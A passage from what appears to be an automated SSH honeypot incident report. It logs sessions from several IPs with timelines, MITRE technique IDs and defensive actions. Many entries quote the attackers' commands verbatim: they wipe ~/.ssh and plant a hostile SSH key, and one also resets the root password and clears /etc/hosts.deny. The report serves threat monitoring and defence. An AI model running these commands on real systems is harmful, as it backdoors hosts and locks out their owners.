| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:23:01` | `cowrie.session.connect` |
| `2026-06-09 14:23:01` | `cowrie.client.version` |
| `2026-06-09 14:23:01` | `cowrie.client.kex` |
| `2026-06-09 14:23:02` | `cowrie.login.success` |
| `2026-06-09 14:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.114[.]250` to AbuseIPDB if not already reported
- [ ] Block `103.52.114[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1279c820527

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:24 |
| **Last Seen** | 2026-06-09 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:24:35` | `cowrie.session.connect` |
| `2026-06-09 14:24:35` | `cowrie.client.version` |
| `2026-06-09 14:24:35` | `cowrie.client.kex` |
| `2026-06-09 14:24:36` | `cowrie.login.success` |
| `2026-06-09 14:24:36` | `cowrie.session.params` |
| `2026-06-09 14:24:36` | `cowrie.command.input` |
| `2026-06-09 14:24:36` | `cowrie.command.failed` |
| `2026-06-09 14:24:36` | `cowrie.log.closed` |
| `2026-06-09 14:24:37` | `cowrie.session.params` |
| `2026-06-09 14:24:37` | `cowrie.command.input` |
| `2026-06-09 14:24:37` | `cowrie.session.file_download` |
| `2026-06-09 14:24:37` | `cowrie.log.closed` |
| `2026-06-09 14:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d5b9d12776

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:24 |
| **Last Seen** | 2026-06-09 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:24:39` | `cowrie.session.connect` |
| `2026-06-09 14:24:39` | `cowrie.client.version` |
| `2026-06-09 14:24:39` | `cowrie.client.kex` |
| `2026-06-09 14:24:40` | `cowrie.login.success` |
| `2026-06-09 14:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a88876a1d87

| Field | Detail |
|---|---|
| **Source IP** | `120.87.99[.]202` |
| **First Seen** | 2026-06-09 14:26 |
| **Last Seen** | 2026-06-09 14:27 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:26:52` | `cowrie.session.connect` |
| `2026-06-09 14:26:54` | `cowrie.client.version` |
| `2026-06-09 14:26:54` | `cowrie.client.kex` |
| `2026-06-09 14:26:55` | `cowrie.login.success` |
| `2026-06-09 14:26:56` | `cowrie.session.params` |
| `2026-06-09 14:26:56` | `cowrie.command.input` |
| `2026-06-09 14:26:56` | `cowrie.command.failed` |
| `2026-06-09 14:26:56` | `cowrie.log.closed` |
| `2026-06-09 14:26:57` | `cowrie.session.params` |
| `2026-06-09 14:26:57` | `cowrie.command.input` |
| `2026-06-09 14:26:57` | `cowrie.session.file_download` |
| `2026-06-09 14:26:57` | `cowrie.log.closed` |
| `2026-06-09 14:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.87.99[.]202` to AbuseIPDB if not already reported
- [ ] Block `120.87.99[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd0fd2f9b55

| Field | Detail |
|---|---|
| **Source IP** | `120.87.99[.]202` |
| **First Seen** | 2026-06-09 14:27 |
| **Last Seen** | 2026-06-09 14:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:27:02` | `cowrie.session.connect` |
| `2026-06-09 14:27:04` | `cowrie.client.version` |
| `2026-06-09 14:27:04` | `cowrie.client.kex` |
| `2026-06-09 14:27:05` | `cowrie.login.success` |
| `2026-06-09 14:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.87.99[.]202` to AbuseIPDB if not already reported
- [ ] Block `120.87.99[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab280fa07565

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:37 |
| **Last Seen** | 2026-06-09 14:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:37:13` | `cowrie.session.connect` |
| `2026-06-09 14:37:13` | `cowrie.client.version` |
| `2026-06-09 14:37:13` | `cowrie.client.kex` |
| `2026-06-09 14:37:13` | `cowrie.login.success` |
| `2026-06-09 14:37:14` | `cowrie.session.params` |
| `2026-06-09 14:37:14` | `cowrie.command.input` |
| `2026-06-09 14:37:14` | `cowrie.command.failed` |
| `2026-06-09 14:37:14` | `cowrie.log.closed` |
| `2026-06-09 14:37:14` | `cowrie.session.params` |
| `2026-06-09 14:37:14` | `cowrie.command.input` |
| `2026-06-09 14:37:14` | `cowrie.session.file_download` |
| `2026-06-09 14:37:14` | `cowrie.log.closed` |
| `2026-06-09 14:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955582f27902

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:37 |
| **Last Seen** | 2026-06-09 14:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:37:16` | `cowrie.session.connect` |
| `2026-06-09 14:37:16` | `cowrie.client.version` |
| `2026-06-09 14:37:16` | `cowrie.client.kex` |
| `2026-06-09 14:37:16` | `cowrie.login.success` |
| `2026-06-09 14:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba4cf6fde4a

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:38 |
| **Last Seen** | 2026-06-09 14:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:38:59` | `cowrie.session.connect` |
| `2026-06-09 14:38:59` | `cowrie.client.version` |
| `2026-06-09 14:39:00` | `cowrie.client.kex` |
| `2026-06-09 14:39:00` | `cowrie.login.success` |
| `2026-06-09 14:39:00` | `cowrie.session.params` |
| `2026-06-09 14:39:00` | `cowrie.command.input` |
| `2026-06-09 14:39:00` | `cowrie.command.failed` |
| `2026-06-09 14:39:01` | `cowrie.log.closed` |
| `2026-06-09 14:39:01` | `cowrie.session.params` |
| `2026-06-09 14:39:01` | `cowrie.command.input` |
| `2026-06-09 14:39:01` | `cowrie.session.file_download` |
| `2026-06-09 14:39:01` | `cowrie.log.closed` |
| `2026-06-09 14:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78238f62428d

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:39 |
| **Last Seen** | 2026-06-09 14:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:39:03` | `cowrie.session.connect` |
| `2026-06-09 14:39:03` | `cowrie.client.version` |
| `2026-06-09 14:39:03` | `cowrie.client.kex` |
| `2026-06-09 14:39:03` | `cowrie.login.success` |
| `2026-06-09 14:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103e30798092

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:40 |
| **Last Seen** | 2026-06-09 14:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:40:53` | `cowrie.session.connect` |
| `2026-06-09 14:40:53` | `cowrie.client.version` |
| `2026-06-09 14:40:53` | `cowrie.client.kex` |
| `2026-06-09 14:40:54` | `cowrie.login.success` |
| `2026-06-09 14:40:54` | `cowrie.session.params` |
| `2026-06-09 14:40:54` | `cowrie.command.input` |
| `2026-06-09 14:40:54` | `cowrie.command.failed` |
| `2026-06-09 14:40:54` | `cowrie.log.closed` |
| `2026-06-09 14:40:54` | `cowrie.session.params` |
| `2026-06-09 14:40:54` | `cowrie.command.input` |
| `2026-06-09 14:40:55` | `cowrie.session.file_download` |
| `2026-06-09 14:40:55` | `cowrie.log.closed` |
| `2026-06-09 14:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe2028145ade

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:40 |
| **Last Seen** | 2026-06-09 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:40:56` | `cowrie.session.connect` |
| `2026-06-09 14:40:56` | `cowrie.client.version` |
| `2026-06-09 14:40:56` | `cowrie.client.kex` |
| `2026-06-09 14:40:57` | `cowrie.login.success` |
| `2026-06-09 14:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d0595172a8f

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:42 |
| **Last Seen** | 2026-06-09 14:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:42:53` | `cowrie.session.connect` |
| `2026-06-09 14:42:53` | `cowrie.client.version` |
| `2026-06-09 14:42:53` | `cowrie.client.kex` |
| `2026-06-09 14:42:53` | `cowrie.login.success` |
| `2026-06-09 14:42:54` | `cowrie.session.params` |
| `2026-06-09 14:42:54` | `cowrie.command.input` |
| `2026-06-09 14:42:54` | `cowrie.command.failed` |
| `2026-06-09 14:42:54` | `cowrie.log.closed` |
| `2026-06-09 14:42:54` | `cowrie.session.params` |
| `2026-06-09 14:42:54` | `cowrie.command.input` |
| `2026-06-09 14:42:54` | `cowrie.session.file_download` |
| `2026-06-09 14:42:54` | `cowrie.log.closed` |
| `2026-06-09 14:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2265a6f576

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:42 |
| **Last Seen** | 2026-06-09 14:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:42:56` | `cowrie.session.connect` |
| `2026-06-09 14:42:56` | `cowrie.client.version` |
| `2026-06-09 14:42:56` | `cowrie.client.kex` |
| `2026-06-09 14:42:56` | `cowrie.login.success` |
| `2026-06-09 14:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09795cc33fd1

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:44 |
| **Last Seen** | 2026-06-09 14:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:44:51` | `cowrie.session.connect` |
| `2026-06-09 14:44:51` | `cowrie.client.version` |
| `2026-06-09 14:44:51` | `cowrie.client.kex` |
| `2026-06-09 14:44:51` | `cowrie.login.success` |
| `2026-06-09 14:44:51` | `cowrie.session.params` |
| `2026-06-09 14:44:51` | `cowrie.command.input` |
| `2026-06-09 14:44:51` | `cowrie.command.failed` |
| `2026-06-09 14:44:52` | `cowrie.log.closed` |
| `2026-06-09 14:44:52` | `cowrie.session.params` |
| `2026-06-09 14:44:52` | `cowrie.command.input` |
| `2026-06-09 14:44:52` | `cowrie.session.file_download` |
| `2026-06-09 14:44:52` | `cowrie.log.closed` |
| `2026-06-09 14:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e23f74685ce

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:44 |
| **Last Seen** | 2026-06-09 14:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:44:54` | `cowrie.session.connect` |
| `2026-06-09 14:44:54` | `cowrie.client.version` |
| `2026-06-09 14:44:54` | `cowrie.client.kex` |
| `2026-06-09 14:44:54` | `cowrie.login.success` |
| `2026-06-09 14:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa7435f0f16

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-06-09 14:47 |
| **Last Seen** | 2026-06-09 14:48 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IdestpKCt5GJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:47:56` | `cowrie.session.connect` |
| `2026-06-09 14:47:57` | `cowrie.client.version` |
| `2026-06-09 14:47:57` | `cowrie.client.kex` |
| `2026-06-09 14:47:57` | `cowrie.login.success` |
| `2026-06-09 14:47:58` | `cowrie.session.params` |
| `2026-06-09 14:47:58` | `cowrie.command.input` |
| `2026-06-09 14:47:58` | `cowrie.command.failed` |
| `2026-06-09 14:47:58` | `cowrie.log.closed` |
| `2026-06-09 14:47:58` | `cowrie.session.params` |
| `2026-06-09 14:47:58` | `cowrie.command.input` |
| `2026-06-09 14:47:58` | `cowrie.session.file_download` |
| `2026-06-09 14:47:58` | `cowrie.log.closed` |
| `2026-06-09 14:48:14` | `cowrie.session.params` |
| `2026-06-09 14:48:14` | `cowrie.command.input` |
| `2026-06-09 14:48:15` | `cowrie.log.closed` |
| `2026-06-09 14:48:15` | `cowrie.session.params` |
| `2026-06-09 14:48:15` | `cowrie.command.input` |
| `2026-06-09 14:48:15` | `cowrie.log.closed` |
| `2026-06-09 14:48:15` | `cowrie.session.params` |
| `2026-06-09 14:48:15` | `cowrie.command.input` |
| `2026-06-09 14:48:15` | `cowrie.session.file_download` |
| `2026-06-09 14:48:15` | `cowrie.log.closed` |
| `2026-06-09 14:48:16` | `cowrie.session.params` |
| `2026-06-09 14:48:16` | `cowrie.command.input` |
| `2026-06-09 14:48:16` | `cowrie.log.closed` |
| `2026-06-09 14:48:16` | `cowrie.session.params` |
| `2026-06-09 14:48:16` | `cowrie.command.input` |
| `2026-06-09 14:48:16` | `cowrie.log.closed` |
| `2026-06-09 14:48:17` | `cowrie.session.params` |
| `2026-06-09 14:48:17` | `cowrie.command.input` |
| `2026-06-09 14:48:17` | `cowrie.command.input` |
| `2026-06-09 14:48:17` | `cowrie.log.closed` |
| `2026-06-09 14:48:17` | `cowrie.session.params` |
| `2026-06-09 14:48:17` | `cowrie.command.input` |
| `2026-06-09 14:48:17` | `cowrie.log.closed` |
| `2026-06-09 14:48:17` | `cowrie.session.params` |
| `2026-06-09 14:48:17` | `cowrie.command.input` |
| `2026-06-09 14:48:18` | `cowrie.log.closed` |
| `2026-06-09 14:48:18` | `cowrie.session.params` |
| `2026-06-09 14:48:18` | `cowrie.command.input` |
| `2026-06-09 14:48:18` | `cowrie.log.closed` |
| `2026-06-09 14:48:18` | `cowrie.session.params` |
| `2026-06-09 14:48:18` | `cowrie.command.input` |
